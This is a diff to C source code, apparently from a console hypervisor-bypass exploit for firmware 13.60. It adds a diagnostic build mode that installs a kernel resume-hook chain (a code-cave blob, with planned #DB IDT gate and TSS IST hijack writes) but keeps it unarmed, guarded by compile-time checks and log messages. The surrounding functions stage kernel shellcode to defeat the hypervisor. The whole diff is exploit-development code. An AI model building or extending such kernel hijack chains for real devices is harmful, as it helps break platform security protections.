@@ -227,6 +227,41 @@ int pl5_dump_offsets(void);
 #define PL5_DIAG 3
 #endif
 
+/*
+ * T5b: install the resume chain but leave the hijack NOT live (compiled only with
+ * -DPL5_1360_INSTALL_NO_ARM=1).
+ *
+ * The question is narrower than T5's. T5 showed that the page-table staging
+ * survives a standby/resume cycle; T5b asks whether the *installation* writes --
+ * the chain image, the blob copied into the cave, the oracle -- change that cycle
+ * while the hook has never been made live.
+ *
+ * Separability is not an assumption here, it is what the engine already states:
+ * kh_arm() is documented as "write only the TSS IST slot and the #DB IDT gate",
+ * and kh_install() "can run with KH_SKIP_IST|KH_SKIP_GATE so the hijack is not
+ * live until this call" (source/byepervisor/khook.c). So the arming step is
+ * exactly those two writes, and this build suppresses them with a compile-time
+ * constant mask, never calls the trigger, keeps the RSI redirect off and uses the
+ * report-only post-resume path.
+ *
+ * Preconditions are refused at compile time rather than documented: arming,
+ * acknowledgement, takeover and pre-sleep staging must all be off, the post-resume
+ * path must be report-only, and PL5_DIAG must stay below 10 so the P4 bisection
+ * stages cannot overwrite the mask.
+ */
+#ifndef PL5_1360_INSTALL_NO_ARM
+#define PL5_1360_INSTALL_NO_ARM 0
+#endif
+#if PL5_1360_INSTALL_NO_ARM &&                                                  \
+    (!PL5_1360_RESUME_REPORT_ONLY || PL5_1360_ARM_HOOK ||                       \
+     PL5_1360_ACK_EXPERIMENTAL_ARMING || PL5_1360_TAKEOVER ||                   \
+     PL5_1360_STAGE_PRE_SLEEP)
+#error "13.60: PL5_1360_INSTALL_NO_ARM=1 requires PL5_1360_RESUME_REPORT_ONLY=1 and PL5_1360_ARM_HOOK=0, PL5_1360_ACK_EXPERIMENTAL_ARMING=0, PL5_1360_TAKEOVER=0, PL5_1360_STAGE_PRE_SLEEP=0 -- T5b installs the chain without ever making the hijack live"
+#endif
+#if PL5_1360_INSTALL_NO_ARM && PL5_DIAG >= 10
+#error "13.60: PL5_1360_INSTALL_NO_ARM=1 requires PL5_DIAG < 10 -- the P4 bisection stages assign kh_diag_skip_mask themselves and would overwrite the mask that keeps the hijack not live"
+#endif
+
 /* khook wants int-returning read/write function pointers; the project helpers
  * are void, so wrap them. */
 static int by_read(uint64_t kaddr, void *dst, size_t len) {
@@ -773,7 +808,14 @@ static int install_resume_hook(uint64_t cave_addr, int redirect) {
     return -1;
   }
 
-#if PL5_DIAG == 18
+#if PL5_1360_INSTALL_NO_ARM
+  /* T5b: nothing live. The gate and IST writes are what kh_arm() would do, so
+   * they are suppressed here *as well as* at the call site: the mask is a
+   * compile-time constant in this build and cannot depend on out-of-band state. */
+  kh_diag_skip_mask = KH_SKIP_IST | KH_SKIP_GATE;
+  notify("13.60: T5b: hijack NOT live (gate+IST writes suppressed, mask=%#x)\n",
+         kh_diag_skip_mask);
+#elif PL5_DIAG == 18
   /* arm-late: stage everything, but keep the #DB gate and the IST slot out of
    * it; kh_arm() writes those right before the standby request. */
   kh_diag_skip_mask = KH_SKIP_IST | KH_SKIP_GATE;
@@ -806,7 +848,11 @@ static int install_resume_hook(uint64_t cave_addr, int redirect) {
          sceKernelGetCurrentCpu(), (unsigned long)ktext, (unsigned long)scratch,
          (unsigned long)hook.hook_kaddr, (unsigned long)hook.idt_base,
          (unsigned long)hook.tss_base);
-#if PL5_DIAG == 18
+#if PL5_1360_INSTALL_NO_ARM
+  /* T5b: the trigger exercises the hook (single-step #DB). Not calling it is what
+   * makes "installed but never live" true rather than merely intended. */
+  notify("13.60: T5b: kh_trigger SKIPPED (hijack not live by design)\n");
+#elif PL5_DIAG == 18
   notify("13.60: P4 diag18: self-test trigger deferred to arm-late\n");
 #elif PL5_DIAG == 16
   notify("13.60: P4 diag16: kh_trigger SKIPPED (gate+IST swapped, never exercised)\n");
@@ -1101,9 +1147,9 @@ int hv_defeat_1360_report_resume(void) {
   uint64_t e = 0, a;
 
   notify("13.60: [R0] report-only resume reached (diag=%d arm=%d ack=%d "
-         "takeover=%d stage_pre_sleep=%d)\n",
+         "takeover=%d stage_pre_sleep=%d install_no_arm=%d)\n",
          PL5_DIAG, PL5_1360_ARM_HOOK, PL5_1360_ACK_EXPERIMENTAL_ARMING,
-         PL5_1360_TAKEOVER, PL5_1360_STAGE_PRE_SLEEP);
+         PL5_1360_TAKEOVER, PL5_1360_STAGE_PRE_SLEEP, PL5_1360_INSTALL_NO_ARM);
 
   if (pm == 0 || cave_addr == 0) {
     notify("13.60: [R1] cannot resolve pmap_store/data_cave; report incomplete.\n");
@@ -1355,7 +1401,20 @@ int hv_defeat_1360(void *shellcode_kernel, size_t shellcode_kernel_len) {
 # endif
   notify("13.60: P4 diag=%d skip_mask=%#x\n", PL5_DIAG, kh_diag_skip_mask);
 #endif
-#if PL5_1360_ARM_HOOK
+#if PL5_1360_INSTALL_NO_ARM
+  /* T5b: install the chain, leave the hijack not live. The mask is set here as a
+   * literal (not inherited from the diag stages), the redirect is off, and the
+   * trigger is skipped inside install_resume_hook(). Everything else does happen,
+   * which is the point: this is the installation, without the arming. */
+  kh_diag_skip_mask = KH_SKIP_IST | KH_SKIP_GATE;
+  notify("13.60: T5b: installing the chain with the hijack NOT live "
+         "(mask=%#x, trigger skipped, redirect off)\n", kh_diag_skip_mask);
+  ret = install_resume_hook(cave_addr, /*redirect=*/0);
+  if (ret) {
+    notify("13.60: T5b install failed (khook rc=%d).\n", ret);
+    return -1;
+  }
+#elif PL5_1360_ARM_HOOK
   ret = install_resume_hook(cave_addr, PL5_DIAG >= 2);
   if (ret) {
     notify("13.60: hook install failed (khook rc=%d).\n", ret);
